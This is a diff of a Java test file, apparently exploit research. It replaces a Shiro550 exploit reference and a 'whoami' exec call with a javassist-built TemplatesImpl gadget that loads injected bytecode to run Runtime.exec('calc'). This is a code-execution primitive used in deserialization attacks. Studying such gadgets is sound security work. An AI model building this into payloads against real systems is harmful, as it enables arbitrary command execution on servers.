@@ -1,16 +1,28 @@
-import java.io.UnsupportedEncodingException;
-import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
-import java.util.List;
-import exploit.Shiro;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import util.ReflectionUtils;
 
 public class ArrayTest {
     public static void main(String[] args) throws Exception {
-//        Shiro shiro=new Shiro();
-//        Shiro.Shiro550 shiro550=shiro.new Shiro550();
-//        shiro550.shiroCB();
-        System.out.println(Runtime.getRuntime().exec("whoami"));
-        Thread.currentThread().sleep(100);
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass("Squirt1e");
+        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"calc\"});";
+        cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"calc\"});";
+        cc.makeClassInitializer().insertBefore(cmd);
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        cc.writeFile();
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]{classBytes};
+        TemplatesImpl templates =  new TemplatesImpl();
+        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
+        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");
+        ReflectionUtils.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        templates.newTransformer();
 
     }
 }
